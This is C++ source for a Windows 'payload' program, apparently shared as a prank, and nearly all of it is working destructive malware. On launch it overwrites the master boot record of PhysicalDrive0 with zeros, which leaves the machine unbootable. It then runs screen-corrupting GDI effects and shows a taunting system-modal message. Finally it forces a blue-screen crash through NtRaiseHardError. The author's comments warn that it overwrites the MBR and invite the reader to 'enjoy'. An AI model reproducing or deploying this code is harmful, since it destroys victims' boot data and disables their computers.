#include <Windows.h>
#include <ntstatus.h>
//written by Maruf in C++ hey but be careful it also overwrites the mbr! and has many payloads! enjoy.........
// added some more payloads :D
#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
	NTSTATUS error_status,
	ULONG number_of_parameters,
	ULONG unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG response_option,
	PULONG reponse);
#pragma warning(default:4716)
DWORD WINAPI bsod(LPVOID lpstart)
{
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BOOLEAN enabled;
	if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0)
	{
		pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
		ULONG response;
		NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &response);
	}
}
DWORD WINAPI mbr(LPVOID lpstart)
{
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
}
DWORD WINAPI message(LPVOID lpstart)
{
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	Sleep(10000);
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
}
DWORD WINAPI colours(LPVOID lpstart)
	{
		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);
		int xs = GetSystemMetrics(SM_CXSCREEN);
		int ys = GetSystemMetrics(SM_CYSCREEN);
		while (true) {
			upWnd = GetForegroundWindow();
			upHdc = GetDC(upWnd);
			desktop = GetDC(NULL);
			BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);
			Sleep(500);
		}
	}

DWORD WINAPI glitches(LPVOID lpstart)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (1)
		{
			int x1 = rand() % (x - 400);
			int y1 = rand() % (y - 400);
			int x2 = rand() % (x - 400);
			int y2 = rand() % (y - 400);
			int w = rand() % 400;
			int h = rand() % 400;

			BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
			Sleep(150);
		}

	}

DWORD WINAPI tunnel(LPVOID lpstart)
	{
		HDC hdc = GetDC(0);
		RECT rect;
		HWND hwnd = GetDesktopWindow();
		while (1)
		{
			GetWindowRect(hwnd, &rect);
			StretchBlt(hdc, 25, 25, rect.right - 50, rect.bottom - 50, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
			Sleep(100);
		}

	}

DWORD WINAPI invers(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (1)
		{
			BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
			Sleep(2000);
		}
}

DWORD WINAPI drawwarning(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (true)
		{
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
			Sleep(100);
		}
}

DWORD WINAPI drawerror(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		POINT pt;
		while (true)
		{
			GetCursorPos(&pt);
			DrawIcon(hdc, pt.x, pt.y, LoadIcon(0, IDI_HAND));
		}
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
	CreateThread(0, 0, mbr, 0, 0, 0);
	Sleep(9);
	CreateThread(0, 0, drawerror, 0, 0, 0);
	Sleep(10000);
	CreateThread(0, 0, message, 0, 0, 0);
	CreateThread(0, 0, drawwarning, 0, 0, 0);
	Sleep(10000);
	CreateThread(0, 0, invers, 0, 0, 0);
	Sleep(10000);
	CreateThread(0, 0, tunnel, 0, 0, 0);
	Sleep(10000);
	CreateThread(0, 0, glitches, 0, 0, 0);
	CreateThread(0, 0, colours, 0, 0, 0);
	Sleep(50000);
	CreateThread(0, 0, bsod, 0, 0, 0);
	Sleep(-1);
}
